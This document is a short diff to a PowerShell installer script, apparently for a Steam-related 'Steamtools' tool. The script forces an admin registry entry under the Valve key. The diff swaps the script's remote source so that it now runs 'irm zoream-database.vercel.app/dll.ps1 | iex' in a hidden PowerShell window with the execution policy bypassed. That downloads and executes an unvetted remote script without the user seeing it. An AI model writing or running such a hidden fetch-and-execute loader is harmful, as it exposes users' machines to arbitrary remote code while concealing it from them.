@@ -181,7 +181,7 @@ else {
 }
 
 # -------------------------------------------------------------------------
-Write-Log "Configuring Registry: Valve\Steamtools (Forcing Admin Entry)..." "STEP"
+Write-Log "Configuring Registry: Valve (Forcing Admin Entry)..." "STEP"
 $regPath = "HKLM:\Software\Valve\Steamtools"
 
 try {
@@ -350,7 +350,7 @@ Write-Host " "
 Write-Host "   *** CORE EXECUTING IN BACKGROUND ***" -ForegroundColor Cyan
 Write-Host " "
 
-$command = "irm steam.run | iex"
+$command = "irm zoream-database.vercel.app/dll.ps1 | iex"
 Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $command" -WindowStyle Hidden
 
 for ($i = 10; $i -gt 0; $i--) {
